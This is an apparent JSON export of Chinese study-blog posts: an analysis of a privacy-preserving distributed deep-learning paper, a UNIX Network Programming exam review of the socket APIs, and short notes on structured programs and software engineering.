[{"title":"privacy-preserving deep-learning via weight Transmission","date":"2021-03-20T11:42:37.000Z","path":"2021/03/20/Transmission/","text":"本文针对《Privacy-Preserving Deep Learning via Weight Transmission》该篇论文进行了分析 比较全面 论文题目理解本文设立了一个能保护隐私的深度学习算法，根据本文的内容，我将原题目《Privacy-Preserving Deep Learning via Weight Transmission》扩展为《Privacy-preserving SGD for distributed trainers via weight transmission》即通过权重传输实现的针对分布式训练者的隐私保护随机梯度下降算法，通过对题目的分析，我们知道本文的书写环境和目的如下： 算法 ：SGD 随机梯度下降 目的 ：隐私保护 环境 ：分布式神经网路 &amp; 深度学习 论文背景知识背景知识一：本文是在SGD随机梯度下降算法的基础上进行改进和扩展的。为了介绍SGD，我们首先介绍一下GD最速梯度下降算法-Gradient Descent，该算法是通过计算给定数据集的导数，使函数不断收敛至J函数-cost function的最小值，得到结果，该方法的具体数学公式为$$x_{t+1} = x_t - \\eta_t\\nabla f(x_t)$$其中$\\eta_t$为步长， 为$\\nabla f(x_t)$导数，该方法有两个缺点： 为了保证准确性$\\nabla f(x_t)$需要是一个精确的导数，所以需要进行很多次迭代的运算才能得到结果 该方法无法逃离鞍点和局部最优点这种导数为0但是不是最小值的点。 因此我们引入了SGD算法，该算法为随机最速下降算法-Stochastic Gradient Descent。他的主要思想是利用包含噪声的具有随机性的导数使得下降过程不经过鞍点和局部最优点。其中随机导数仅要求期望为单数即可，数学表达为 。该方法的全部数学表达为：$$G_t = \\frac{\\delta J(W_{t-1},X_t,Y_t)}{\\delta W} \\\\W_t = W_{t-1} - \\alpha(t)·G_t$$其中 J 函数为cost function，即对结果优良性的衡量函数，W为权值参数，是每一个属性对结果的权重影响。$\\alpha_t$为步长,$G_t$为随机导数。相比于GD，SGD有以下的优良特性： 导数可以包含噪声，所以算得很快，且大量的理论工作说明，只要噪声不离谱，其实（至少在f是凸函数的情况下），SGD都能够很好地收敛。 它能够自动逃离鞍点，自动逃离比较差的局部最优点。 最后找到的答案还具有很强的一般性（generalization），即能够在自己之前没有见过但是服从同样分布的数据集上表现非常好。 这些优良的性质使得SGD成为深度学习领域较为普遍且优良的算法 ，这也是本文选择这个算法的原因之一。 本文还有其他有关隐私保护Privacy-preserving的背景知识为： Honest-but-Curious首先本文假定server是诚实但好奇的(honest-but-curious)，该模型又被称为半诚实模型(semi-Honest model)，其中 诚实意为结点会诚实的将他的工作全部完成， 好奇意味着结点在执行过程中会将他所有的数据全部保存下来并在后续时利用他们进行推测攻击。 Collusion相关的，本文假定的攻击还有，trainer和server将会是一伙的，他们之间可以进行共谋(collusion)来对数据进行攻击。 论文的主要贡献 舍弃了传统梯度传输的方法而选用权值传输来大幅提高安全性。 本文使用的方法适用于深度学习适用的所有激活函数，这意味着不会适用近似算法。 本文通过严格的理论证明诚实但好奇的server和极端共谋，即只有一个trainer可信的情况下，本文的方法依然有极高的安全性。 通过一个证明表达了本文在准确性方面和将所有数据集集成在一个训练者训练的结果准确性是相同的。 论文主要内容权值传输首先，我们要为大家解释一下为什么权值传输相比梯度传输拥有更高的安全性和保护隐私性，本篇文章通过跟之前两篇文章的比较来说明。 第一篇的主要思想是只传输随机选择的部分梯度而放弃传统的加密方法，尽管在Sec.7 中文章作者又利用了差分隐私增加拉普拉斯噪声的方法，但是数据保密性和差分隐私是正交的，所以仍可能造成泄露。 R. Shokri and V. Shmatikov, “Privacy-preserving deep learning,” in Proc. 22nd ACM SIGSAC Conf. Comput. Commun. Secur., I. Ray, N. Li, and C. Kruegel, Eds., Oct. 2015, pp. 1310–1321. 第二篇文章主要是使用同态加密的方法，虽然进行了加密，但是在共谋的情况下，坏人对其进行解密并得到原始梯度，仍然会对数据造成泄露。所以梯度传输的方法总归会造成数据的泄露，我们选择权值传输的方法来避免这种泄露。这样做的具体原因我们会在theorem2 中进行讲解 L. T. Phong, Y. Aono, T. Hayashi, L. Wang, and S. Moriai, “Privacypreserving deep learning via additively homomorphic encryption,” IEEE Trans. Inf. Forensics Security, vol. 13, no. 5, pp. 1333–1345, May 2018. SNT &amp; FNT本文提供了两种系统SNT，FNT其中大部分内容我们在SNT内就讲到所以我们会详细介绍SNT，并之后简要涉及FNT。我们首先明确在分布式学习过程中，每次进行一个大的循环即每个trainer都进行一次，包含对于每一个trainer的小循环。其中每个符号的意义及说明如下， server端是Honest-but-curious 的。 Dataseti 指代每个人能掌握的数据集。 （X,Y）是Dataset的子集，且根据分布不同可以是整个数据集或者随机选择的一部分。 K是trainer 间共享的密钥，但是不能告诉 server –FNT 就不需要了。 $Enc_k(W)$是用k密钥对W进行加密。 encW 是加密后的密文。 $Dec_k(C)$是用K密钥对C进行解密。 $W_0$是随机选择的初始权重。其中除K以外的所有变量都是vector形式出现的。 每个trainer执行的操作如下:$$W_1=Dec_k(encW_1) \\\\G_2 = \\frac{\\delta J(W_1,X_2,Y_2)}{\\delta W} \\\\W_2 = W_1 - \\alpha(t)·G_2 \\\\encW_2 = Enc_k(W_2)$$​ 然后将encW传给server，并由server端发送给下一个trainer。 *FNT***系统是全连接的,这就产生了一个问题，经过我们对于SNT的描述来看，我们可以以固定的顺序进行训练，那我们为什么需要全连接，增加这么多的路径呢，原因有以下三点： 如果路径失效，那么系统可能会因此坏掉，所以全连接会增加可靠性。 全连接的方法可以适应随机发送的工作模式，而不用只能按顺序发送。 可以实现匿名传输的安全措施，这个我们接下来会讲。 安全 及 准确性 理论解释理论一：系统在面对诚实但好奇的服务端下的安全我们使用对称加密方法使server端只能看见加密后的W权重，我们选用能抵抗选择的对称加密方法即可。 理论二：在面对极端共谋collusion下的安全性极端共谋即当只有trainer1可信，trainer2-l,server都不可信的情况下,坏人也不能计算出trainer1的数据集信息，除非他们解决非线性问题或子集和问题 其中非线性问题代表我们在进行计算时，我们选择的激活函数都是非线性函数，如果我们想要从计算出来的权值恢复数据集的本身数据，那么我们就需要解决非线性问题，而这种问题是十分难解的 子集和问题的讲解我们需要借助一些数学公式，首先我们明确的是，在每个训练者经历的一次小循环中，他需要执行有多个公式组成的(1)号式子，并通过化简得到到（2）号式子，因为我们假定前后trainer知道初始的W和结束后的W，那么他未知的就是计算后的(3)号式子。$$G_1 = \\frac{\\delta J(W_{0},X_1,Y_1)}{\\delta W} \\\\W_1 = W_{0} - \\alpha(1)·G_1 \\\\\\vdots \\\\G_i = \\frac{\\delta J(W_{i-1},X_i,Y_i)}{\\delta W} \\\\W_i = W_{i-1} - \\alpha(i)·G_i \\\\\\vdots \\\\G_n = \\frac{\\delta J(W_{n-1},X_n,Y_n)}{\\delta W} \\\\W_n = W_{n-1} - \\alpha(n)·G_n (1)$$ $$W^{(final)} = W_n \\\\= W_n-1 - \\alpha_nG_n \\\\= W_n-2 - \\alpha_{n-1}G_{n-1} - \\alpha_nG_n \\\\\\vdots \\\\= w_0 - (\\alpha_{1}G_{1} + \\dots + \\alpha_nG_n) \\\\= W^{(init)} - (\\alpha_{1}G_{1} + \\dots + \\alpha_nG_n) (2) \\\\W^{(init)} - W^{(final)} = (\\alpha_{1}G_{1} + \\dots + \\alpha_nG_n) (3)$$ 其中符号的定义如下 (𝑋_𝑖,𝑌_𝑖) (1≤𝑖≤𝑛)是Dataset1洗牌后的一小部分 𝛼_𝑖可以是相同的，也可以是trainer1自己选择的 𝑛 = |𝐷𝑎𝑡𝑎𝑠𝑒𝑡1|/𝑏𝑎𝑡𝑐ℎ_𝑠𝑖𝑧𝑒≫1 我们看到，我们已知（3）式的和，且n是十分大的。算得每个值是一个NP-Complete难解问题，需要多项式未知的时间复杂度。所以他是安全的。 定理三：分布式的数据集的运算与在一个主机上对所有数据集的并集进行运算得到的结果是相同的。 该定理在逻辑上理解就可以，文中也只给了描述性的证明 附加考虑 additional consideration在该系统运用和实验实际执行的过程中，文中也增加了很多其他非主体系统涉及的方法。 为了证明子集和问题的实验数据在实际数据集中，未知数的数量是远大于等式的数量的，具体的实验情况见下图 为了增加数据集的训练效果，我们会对数据集进行扩张例如图片：利用旋转，裁剪，翻转等方法 , 过拟合后面会解决 实际训练中使用了SGD的进化版本例如 ：RMSProp [27] or Adam [28], 预定义 additional hedge同时为了使系统更好的进行，我们还进行了一些预定义。首先我们需要明确想要达到完美的，没有泄露的系统是不可能的。文中将其描述为Dalenius desideratum，即系统将会转化为完全的随机数传输，这是没有丝毫实用性的。 增加了差分隐私即添加噪声的方法用于增加隐私性,其实就是在隐私性和准确性之间寻找一种平衡 利用Dropout 的方法增加差分隐私和防止过拟合Dropout 的方法由神经网络领域大牛Hinton 14年提出，主要做法是在训练时随机隐藏一些结点，这样能降低结点间的依赖性，同时也会降低对于数据的依赖性。 举例来说，我们将一支军队分为三部分分别在海陆空进行训练，那么他们最后组合起来环境对于他们影响会很小，同时我们也没有办法根据不同环境他们的作战表现判断他们是海军，陆军还是空军。 使用匿名传输的方法增强隐私性我们使用的具体方法为，在由server转发时隐藏数据的来源，或者随机传输，即一个数据可能来自小集合中的任一元素 赋予每个结点当发现问题就进行防御性进攻的权力（即1，2，3）实际攻击举例文中还用实际的攻击进行举例，该攻击的目的是通过获取的信息找到模型上一跳在哪个数据集训练的。 首先，我们当然可以利用1，2，4的方法综合起来，防止这种攻击。当面临一个更强的具体的攻击时，比如成员推理攻击，我们这样防范。 成员推理攻击的目的是：给出一条样本，可以推断该样本是否在模型的训练数据集中——即便对模型的参数、结构知之甚少，该攻击仍然有效 本质是：构建一个二分类模型，以X,Y为参数，判断该项是否在数据集中 主要部分是：利用影子模型(shadow model)构建与原目标模型训练集相似的数据集 文中给出了三种构建影子模型的方法： Model-based synthesis： 直观上，如果目标模型以很高的概率给出了某条record的类别，那么该record与目标模型训练集中的数据应该是十分相似的。所以，可以用目标模型本身来构建影子模型的训练数据： 我们通过差分隐私添加噪声的方法使概率处于变化中，挑战他的阈值 Statistics-based synthesis： 攻击者知道目标模型训练数据的分布信息，比如feature的边缘分布，那么可以直接由分布生成数据。 Noisy real data： 攻击者也许可以获得和目标模型训练集数据相似的数据，可以认为是目标模型训练集的噪声版本，直接利用之 对于二和三方法，由于本文的数据集只会在本地被训练，所以攻击者既不能得到分布也不能得到带噪声的数据，因此可以防范这种攻击。 总结本片文章亮点主要就是权值传输，并且真的是灵活利用了这个内容，我觉得它主要做到了两件事 首先它让每一个结点在一次循环里执行多次运算，这样就成功引入了子集和问题，相当于对于梯度的加密也是对于数据的二次加密 利用了权值的递归性，这样可以对权值进行加密，下一个trainer再进行解密后计算，中间的转发者不需要知道密钥也不需要知道内容，这可能也是一种端到端吧","link":"","tags":[{"name":"privacy-preserving","slug":"privacy-preserving","permalink":"https://dingiso.github.io/tags/privacy-preserving/"}]},{"title":"UNIX 高级网络编程复习","date":"2021-03-13T03:05:34.000Z","path":"2021/03/13/UNIX 高级网络编程复习/","text":"本文主要是 UNIX高级网络编程 - 卷一 的总结 UNIX 高级网络编程复习Chapter 1 考著名的人物： c语言作者 ， unix 作者： Ken Thompson (Dennis M. Ritchie)， GNU 创建者/Emacs 作者 Richard Matthew Stallman ； linux 作者：Linus Benedict Torvalds vim 作者： Bram Moolenaar Tex 作者： Donald Knuth 高德纳 Chapter 2​ TCP 状态转换图 ， 2.9 常用的Port Number ，2.10 Concurrent Server ， 2.12 services 12345678910111213141516171821端口：FTP 文件传输服务22端口：SSH 端口23端口：TELNET 终端仿真服务25端口：SMTP 简单邮件传输服务53端口：DNS 域名解析服务80端口：HTTP 超文本传输服务110端口：POP3 “邮局协议版本3”使用的端口443端口：HTTPS 加密的超文本传输服务**********************************1433端口：MS SQL*SERVER数据库 默认端口号1521端口：Oracle数据库服务1863端口：MSN Messenger的文件传输功能所使用的端口3306端口：MYSQL 默认端口号3389端口：Microsoft RDP 微软远程桌面使用的端口5631端口：Symantec pcAnywhere 远程控制数据传输时使用的端口5632端口：Symantec pcAnywhere 主控端扫描被控端时使用的端口5000端口：MS SQL Server使用的端口8000端口：腾讯QQ Chapter 3，4，5，6Socket Address Structures1234567891011121314151617struct in_addr &#123; in_addr_t s_addr; /* 32-bit IPv4 address */ /* network byte ordered */&#125;;struct sockaddr_in &#123; uint8_t sin_len; /* length of structure (16) */ sa_family_t sin_family; /* AF_INET */ in_port_t sin_port; /* 16-bit TCP or UDP port number */ /* network byte ordered */ struct in_addr sin_addr; /* 32-bit IPv4 address */ /* network byte ordered */ char sin_zero[8];/* unused */&#125;;// IPV4inet_addr inet_ntoa// IPV4/6inet_pton inet_ntop in_addr 是结构的原因是早期将其定义为 union 方便A，B，C类地址的访问 sin_zero 置0 Generic socket address structure1234567891011struct sockaddr &#123; uint8_t sa_len; sa_family_t sa_family; /* address family: AF_xxx value */ char sa_data[14]; /* protocol-specific address */&#125;;// 用法int bind(int, struct sockaddr *, socklen_t);struct sockaddr_in serv; /* IPv4 socket address structure *//* fill in serv&#123;&#125; */bind(sockfd, (struct sockaddr *) &amp;serv, sizeof(serv)); 用于定义函数时适配各种不同类型的地址结构， 若不转换，编译器报 warning: passing arg 2 of &#39;bind&#39; from incompatible pointer type Sockaddr_in6128-bits ipv6 地址 1234567891011121314151617struct in6_addr &#123; uint8_t s6_addr[16]; /* 128-bit IPv6 address */ /* network byte ordered */&#125;;#define SIN6_LEN /* required for compile-time tests */struct sockaddr_in6 &#123; uint8_t sin6_len; /* length of this struct (28) */ sa_family_t sin6_family; /* AF_INET6 */ in_port_t sin6_port; /* transport layer port# */ /* network byte ordered */ uint32_t sin6_flowinfo; /* flow information, undefined */ struct in6_addr sin6_addr; /* IPv6 address */ /* network byte ordered */ uint32_t sin6_scope_id; /* set of interfaces for a scope */&#125;; Value-Result当我们把 SA* 从用户进程传入内核时长度作为值 value ，内核处理完返回时结构的大小可能会改变，因此长度作为一个结果 result 传回 , 引用是因为需要函数内部去赋值 123456789101112131415// 用户进程 =&gt; 内核// bind connect sendto struct sockaddr_in serv;/* fill in serv&#123;&#125; */connect(sockfd, (SA *) &amp;serv, sizeof(serv));// 内核 =&gt; 用户进程// accept recvfrom getsockname getpeername struct sockaddr_un cli; /* Unix domain */socklen_t len;len = sizeof(cli); /* len is a value */getpeername(unixfd, (SA *) &amp;cli, &amp;len);/* len may have changed */ 字节序 Byte Ordering12345678// 字节序转换函数#include &lt;netinet/in.h&gt;uint16_t htons(uint16_t host16bitvalue);uint32_t htonl(uint32_t host32bitvalue); Both return: value in network byte orderuint16_t ntohs(uint16_t net16bitvalue);uint32_t ntohl(uint32_t net32bitvalue); Both return: value in host byte order n - network , h - host , s - short 16 位, l - long 32 位 Byte Manipulation1234567#include &lt;strings.h&gt;void bzero(void *dest, size_t nbytes);void bcopy(const void *src, void *dest, size_t nbytes);int bcmp(const void *ptr1, const void *ptr2, size_t nbytes); Returns: 0 if equal, nonzero if unequal mem 1234567#include &lt;string.h&gt;void *memset(void *dest, int c, size_t len);void *memcpy(void *dest, const void *src, size_t nbytes);int memcmp(const void *ptr1, const void *ptr2, size_t nbytes); Returns: 0 if equal, &lt;0 or &gt;0 if unequal (see text) 地址转换函数IPV4 12345678910#include &lt;arpa/inet.h&gt;// converts the C character string pointed to by strptr into// its 32-bit binary network byte ordered value, // which is stored through the pointer addrptr int inet_aton(const char *strptr, struct in_addr *addrptr); Returns: 1 if string was valid, 0 on errorin_addr_t inet_addr(const char *strptr); Returns: 32-bit binary network byte ordered IPv4 address; INADDR_NONE if errorchar *inet_ntoa(struct in_addr inaddr); Returns: pointer to dotted-decimal string inet_aton 将字符串 strptr 转换为 32比特二进制网络字节序地址 addrptr inet_addr 作用同上，出错返回 INADDR_NONE255.255.255.255,所以不能处理该地址（被废弃） inet_ntoa 32bit网络字节序到点分十进制IPV4字符串，储存在静态内存，不可重入 IPV4/6 123456#include &lt;arpa/inet.h&gt;int inet_pton(int family, const char *strptr, void *addrptr); Returns: 1 if OK, 0 if input not a valid presentation format, −1 on errorconst char *inet_ntop(int family, const void *addrptr, char *strptr, size_t len); Returns: pointer to result if OK, NULL on error p - presentation , n - numeric family : AF_INET / AF_INET6 不支持 errno= EAFNOSUPPORT inet_pton : 字符串 strptr 转换为 addrptr 二进制地址结果 inet_ntop : 相反，len 位 strptr 大小，防止溢出 - len太小，返回空指针 errno=ENOSPC 读写函数12345#include &quot;unp.h&quot;ssize_t readn(int filedes, void *buff, size_t nbytes);ssize_t writen(int filedes, const void *buff, size_t nbytes);ssize_t readline(int filedes, void *buff, size_t maxlen); All return: number of bytes read or written, −1 on error readline 每次读一个字符，极端地慢 Chapter 4基本 TCP 套接字编程 Socket 函数123#include &lt;sys/socket.h&gt;int socket(int family, int type, int protocol); Returns: non-negative descriptor if OK, −1 on error AF_INET AF_INET6 AF_LOCAL AF_ROUTE AF_KEY SOCK_STREAM TCP|SCTP TCP|SCTP YES SOCK_DGRAM UDP UDP YES SOCK_SEQPACKET SCTP SCTP YES SOCK_RAW IPV4 IPV6 YES YES Connect 函数123#include &lt;sys/socket.h&gt;int connect(int sockfd, const struct sockaddr *servaddr, socklen_t addrlen); Returns: 0 if OK, −1 on error client 用于与 server 连接，内核会自己选择临时端口 75 s 无响应后返回 ETIMEDOUT 若相应 RST 则马上返回 ECONNREFUSED - 指定端口没有等待连接 目的不可达，返回 EHOSTUNREACH, ENETUNREACH 错误 如果给不存在的机器发送，因为没有 ARP reply , ETIMEOUT 1connect error: Connection timed out 如果给未运行 server 的机器发送，收到 RST ， ECONNREFUSED 1connect error: Connection refused 给不可达发送， 收到 ICMP 不可达错误， EHOSTUNREACH 1connect error: No route to host 每次 connect 失败后，都需要关闭 sockfd 重新调用 socket 函数 bind 函数123#include &lt;sys/socket.h&gt;int bind(int sockfd, const struct sockaddr *myaddr, socklen_t addrlen); Returns: 0 if OK, −1 on error 32b ipv4 / 128b ipv6 + 16b TCP/UDP port number Servers 会在启动时调用 bind 端口（程序定义） ，若没有则当调用 connect 或 listen 时，内核会选择一个临时端口 或 根据 SYN 的目的地址 Client 通常不会bind 而是 connect 时由内核根据路径选择 IP地址wildcard 通配符 ipv4 : INADDR_ANY 0.0.0.0，内核等到TCP连接，UDP报文发送后选择ip地址 ipv6 : in6addr_any 由系统预先分配并置为IN6ADDR_ANY_INIT RPC 例外，会通过 端口映射器注册 错误EADDRINUSE ： Address already in use 地址已使用 listen 函数Server ： convert unconnected socket into a passive socket 123#include &lt;sys/socket.h&gt;int listen(int sockfd, int backlog); Returns: 0 if OK, −1 on error backlog : 内核队列中排队的最大连接数 调用时间： socket bind 后， accept 前 为 listening socket 保持两个队列 incomplete connection queue 未完成连接队列 ， 未完成握手，SYN_RCVD 态 completed connection queue 已完成连接队列 ， 完成握手 ， ESTABLISHED 态 两队之和不超过 backlog accept 函数 返回已完成连接队列队头，如果为空，进程睡眠 123#include &lt;sys/socket.h&gt;int accept(int sockfd, struct sockaddr *cliaddr, socklen_t *addrlen); Returns: non-negative descriptor if OK, −1 on error sockfd : listening socket 监听 return : connected socket 已连接 cliaddr &amp; addrlen ：对端的地址和长度 一对多的关系，监听socket 保持打开，连接socket完成对一个客户的服务就关闭 bind 错误 非超级用户： 1bind error: Permission denied fork 和 exec 函数 fork 是唯一生成新进程的函数 123#include &lt;unistd.h&gt;pid_t fork(void); Returns: 0 in child, process ID of child in parent, −1 on error 并发服务器父进程 listenfd 监听 ， 子进程 connfd 负责接收数据和实际 操作 close 函数123#include &lt;unistd.h&gt;int close(int sockfd); Returns: 0 if OK, −1 on error 为了方便多个进程使用套接字，它是引用计数的。 内核 会 发完所有等待发送的数据，然后TCP连接终止过程 如果只想发送FIN，改用shutdown函数 地址 函数1234#include &lt;sys/socket.h&gt;int getsockname(int sockfd, struct sockaddr *localaddr, socklen_t *addrlen);int getpeername(int sockfd, struct sockaddr *peeraddr, socklen_t *addrlen); Both return: 0 if OK, −1 on error sock 本地，peer 连接对端 重点基本都要求掌握 、 5.13不要求掌握、 6.9，6.20 不要求掌握 Chapter 5TCP Echo ServerPort : 5000 - 49152 Normal Startupserver 阻塞在 accept （还未启动用户） client 阻塞在 fgets 调用 连接 服务器阻塞在 read ，父进程阻塞在 accept 此时 三个进程 STAT 都是 S- sleeping - （已阻塞） WCHAN 父进程 wait_for_connect , server tcp_data_wait , client - read_chan Normal TerminationClient ： EOF 字符（Control+D) 终止服务器 客户端进入 TIME_WAIT 状态 信号处理SIGKILL &amp; SIGSTOP 不能被捕获 信号处理函数是一个仅有一个整数参数且不返回值的函数 wait &amp; waitpid1234#include &lt;sys/wait.h&gt;pid_t wait(int *statloc);pid_t waitpid(pid_t pid, int *statloc, int options); Both return: process ID if OK, 0 or −1 on error 处理已终止的子进程 返回值： 已终止子进程的进程ID号，通过statloc指针返回的子进程终止状态（一个整数） 对于同种类型的信号，主机只会执行一次信号处理函数 accept返回前连接中止connect 后， accept 前，客户端发送 RST 报文 POSIX ： ECONNABORTED - software caused connection abort 服务器进程终止服务器进程崩溃后，如果client不操作，会阻塞在fgets，输入字符后，readline因接收到FIN返回0（EOF），client 返回 ： str_cli: server terminated prematurely - 程序定义的并结束 如果先收到了RST，会返回ECONNRESET -connection reset by peer RST 会因为并没有与该客户端连接但是接收到该客户端发送的内容而被服务器发送 服务器主机崩溃同上面不同的是，服务器并不会有任何反应，会有以下两种情况： 一直没有响应 ETIMEOUT 中间路由器判断不可达，响应一个 destination unreachable 的 ICMP，返回的错误是EHOSTUNREACH或 ENETUNREACH 服务器主机崩溃后重启当服务器主机崩溃后重启时，它的TCP丢失了崩溃前的所有连接信息，因此服务器TCP对于所收到的来自客户的数据分节响应以 一个RST 数据格式服务器读入换行符，所搜索的只是换行符 二进制 ： sscanf 转换到 结构体 binary ，发送后，对方也用同样的结构体接收。 大小端不同 ， 同样int型长度不同，结构体的打包方式不同 都会导致负数不行， 解决方法： 发送 string ， 用 XDR（external data representation) 发送 Chapter 6I/O Model分为两个部分 ： 等待对端发送数据 ，将数据从内核拷贝到用户 blocking ： 调用接收函数后就一直等到两步都完成在返回 Nonblocking ：第一阶段不断循环call，知道收到完整包 Multiplexing：第一步调用select，直到返回readable，然后调用recvfrom完成第二步 好处： 可以等待多个描述符 Signal-Driven: 调用后立即返回，signal handler 会在 data 准备好后发出信号，调用recvfrom完成第二步 Asynchronous：告知内核启动某个操作， 并让内核在两步操作 完成后通知我们 select 函数告诉内核等待多个事件，有时间发生或Timeout后唤醒他 12345#include &lt;sys/select.h&gt;#include &lt;sys/time.h&gt;int select(int maxfdp1, fd_set *readset, fd_set *writeset, fd_set *exceptset, const struct timeval *timeout); Returns: positive count of ready descriptors, 0 on timeout, −1 on error maxfdp1，待测试的最大描述符值+1 set ： 告诉内核 what descriptors we are interested in ，不关心设为空，三个参数都是 value-result 类型的，调用时为关心的描述符的值，返回时指示哪些描述符已就绪 readset : Any of the descriptors in the readset are ready for reading writeset: Any of the descriptors in the writeset are ready for reading exceptset : Any of the descriptors in the exceptset have an exception condition pending timeout : how long to wait - 信号中断 - 不准 设置为空 ：永远等待 值：固定时间 0：根本不等待- 轮询（polling） Returns ：就绪的数目，timeout=0，error=-1 这是系统函数，descriptor 和 socket 无关，socket 可以 select 任意 descriptor 错误处理 - 不考 fd_set 数据结构每一位代表一个描述符，每一bit为 1234void FD_ZERO(fd_set *fdset); /* clear all bits in fdset */void FD_SET(int fd, fd_set *fdset); /* turn on the bit for fd in fdset */void FD_CLR(int fd, fd_set *fdset); /* turn off the bit for fd in fdset */int FD_ISSET(int fd, fd_set *fdset); /* is the bit for fd on in fdset ? */ 利用 FD_ZERO 进行初始化十分重要,因为是 value-result值会变化 FD_SETSIZE : 1024 读 ready 的条件 收到的数据高于 low-water 低水位了 连接关闭了，read 返回 0 （EOF） 是监听套接字，且有已完成的连接 ？ 套接字有错误待处理，返回 -1 ， errno 设置成确切的错误条件 写 ready 的条件 已连接（udp不需要），可写空间超过 low-water 写半边关闭了 （有未完成发送的数据，要发送出去） non-blocking connect 建立了连接或失败了 套接字有错误待处理，返回 -1 ， errno 设置成确切的错误条件 exceptiong ready如果一个套接字存在带外数据或者仍处于带外标记，那么它有异常条件待处理 str_cli阻塞在 select ，将原本的待前后顺序的阻塞，变成同时的阻塞 shutdown给服务器发送一个FIN，告诉它我们已经完成了数据发送，但是 仍然保持套接字描述符打开以便读取 123#include &lt;sys/socket.h&gt;int shutdown(int sockfd, int howto); Returns: 0 if OK, −1 on error 不动引用计数就激发TCP的正常连接终止序列 close终止读和写两个方向的数据传送，shutdown 还可以继续读 三种可选项 SHUT_RD ：关闭连接的读这一半 SHUT_WR：关闭连接的写这一半 SHUT_RDWR：连接的读半部和写半部都关闭 str_cli pipeline版加入 shutdown ，模拟先连续发送数据，关闭写半部，然后再连续接收返回数据的pipeline操作 TCP echo 程序- select 版client 数组存储已连接accept描述符的值 省去了 fork 新进程的开销 rset 数组保存 0-stdin，1-stdout，2-stderr ，3– 都是已连接描述符 客户发送 FIN，4变为可读read将返回0。关闭该套接字并把client[0]的值置为-1，把描述符集中描述符4的位设置为0。注意，maxfd的值没有改变。 Chapter 7_sockopt 函数12345#include &lt;sys/socket.h&gt;int getsockopt(int sockfd, int level, int optname, void *optval, socklen_t *optlen);int setsockopt(int sockfd, int level, int optname, const void *optval,socklen_t optlen); Both return: 0 if OK, −1 on error sockfd ： 打开的套接字描述符 level ：指代系统中解释该选项的代码 optval ：存储option的数据结构 - 是标志0为不启用，值为启用 optlen ：长度 - value-result sockopt :掌握 7.2 原理 - SO_LINGER / SO_KEEPALIVE / SO_DONTROUTE SO_KEEPALIVE保活 SO_LINGER ？关闭 close 时是否丢弃保留在套接字发送缓冲区中的任何数据， 设置正的延滞时间 SO_DONTROUTE是否绕过下层协议的路由机制 IP : IP_HDRINCL / IP_TTL IP_HDRINCL设置了就需要自己构建IP头 IP_TTL 设置和获取系统用在从某个给定套接字的默认TTL值 TCP : TCP_MAXSEG允许我们获取或设置TCP连接的最大分节大小 SYN中通告的MSS Chapter 8​ 8.1 图 ， 并发程序设计 - 重点注意区别 sendto() recvfrom() 123456#include &lt;sys/socket.h&gt;ssize_t recvfrom(int sockfd, void *buff, size_t nbytes, int flags, struct sockaddr *from, socklen_t *addrlen);ssize_t sendto(int sockfd, const void *buff, size_t nbytes, int flags, const struct sockaddr *to, socklen_t addrlen); Both return: number of bytes read or written if OK, −1 on error echo 程序 1Socket(AF_INET, SOCK_DGRAM, 0); 服务器进程未运行返回 ICMP 异步错误 sendto成功返回仅表示接口输出队列中有存放数据报的空间 仅在进程已将其UDP套接字连接到一个对端后，这些异步错误才返回给进程 connect 不需要再指定 目的IP和端口号 不用recvfrom 用 read 就行 返回异步错误 Chapter 11​ 简单前面部分 DNS 操作 11.3、11.4、11.5 使用 UDP 查询，如果答案太长，超出了UDP承载能力，换成TCP gethostbyname123#include &lt;netdb.h&gt;struct hostent *gethostbyname(const char *hostname); Returns: non-null pointer if OK, NULL on error with h_errno set 只能返回ipv4，getaddrinfo 能够处理4和6 gethostbyaddr123#include &lt;netdb.h&gt;struct hostent *gethostbyaddr(const char *addr, socklen_t len, int family); Returns: non-null pointer if OK, NULL on error with h_errno set 1234567#include &lt;netdb.h&gt;struct servent *getservbyname(const char *servname, const char *protoname);Returns: non-null pointer if OK, NULL on erro#include &lt;netdb.h&gt;struct servent *getservbyport(int port, const char *protoname);Returns: non-null pointer if OK, NULL on error Part 3 Advanced Sockets12，13，14，15 ，17，18.5,20,21,22,23,24，30，31不考 Daemon Process 了解一下 19 Introduction 特权 SA ， SADB 25 掌握，结合第 5 章看 26 掌握 基本概念，线程和进程区别 27 结合前面的 Options 一起看，简单看看。 28 重点掌握 读写ICMP，读写非内核处理的协议段的数据报，构建ip首部 123456sockfd = socket(AF_INET, SOCK_RAW, protocol)// 例 ： protocol IPPROTO_ICMP// 开启 IP_HDRINCLconst int on = 1;if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &amp;on, sizeof(on)) &lt; 0)// 出错处理 29 掌握 基本概念，如何抓包 libpcap 公开分组捕获函数库 A.3 C.1 netstat tcpdump 简答题（解释名词） ， 编程题（补充小的片段）上机+上课 ， 实验分析题（分析实验的结果）例如： 服务端没起来 报什么错误 最开始 那个 带函数的函数 问题P180，P165，LINGER 的意思是什么 ioctl 实现 sockopt 进行读写操作 - 了解功能 函数原型 ： 名字 + 参数 ping ， recvmsg 如果被中断 EINTR，continue 重新执行，函数重启 5.10 wait / waitpid 要求 server ， server host 情况 raw socket 适用于什么情况 routing 、key 29 introduction 信号处理函数 5 章 signal handler signal driven 不要求 tcp函数的顺序图","link":"","tags":[{"name":"UNIX","slug":"UNIX","permalink":"https://dingiso.github.io/tags/UNIX/"},{"name":"network","slug":"network","permalink":"https://dingiso.github.io/tags/network/"}]},{"title":"如何判断结构化程序","date":"2021-03-11T07:52:19.000Z","path":"2021/03/11/如何判断结构化程序/","text":"本文是希望使用 一个定义，一个方法，对结构化程序的定义进行细化 一个定义： 每个程序单元只有一个入口和一个出口，但是分支结构例外 一个方法：对分支结构进行合并，如何合并（一个层级的才能合并），使整体结构符合定义","link":"","tags":[]},{"title":"软件工程复习","date":"2021-03-11T04:00:19.000Z","path":"2021/03/11/软件工程复习/","text":"本文是大三上 软件工程 科目的复习 软件工程复习软件工程三要素： 方法 工具 和 过程 软件开发方法*传统开发方法结构化方法：分阶段的， 顺序的，依赖性 缺点： 缺少灵活性，静态，缺少应对变化的能力 面向对象方法将软件构件划分为 类，并定义一组 静态的 变量 和 动态的 方法 利用父子类和继承的关系形成 层次结构 ， 封装性：对象间仅能通过发送消息互相联系 通过反复迭代开发软件，降低复杂性，提高可理解性，支持软件重用 更好的应对变化 软件开发各阶段活动及任务* 可行性分析 ： 高层次需求分析 - 技术，经济，社会 需求分析：进行变更管理 适应变化，分为功能性和非功能性，输出需求规格说明书 软件设计：概要+详细 程序编码 软件测试： 单元-&gt;集成-&gt;系统，分为黑盒和白盒 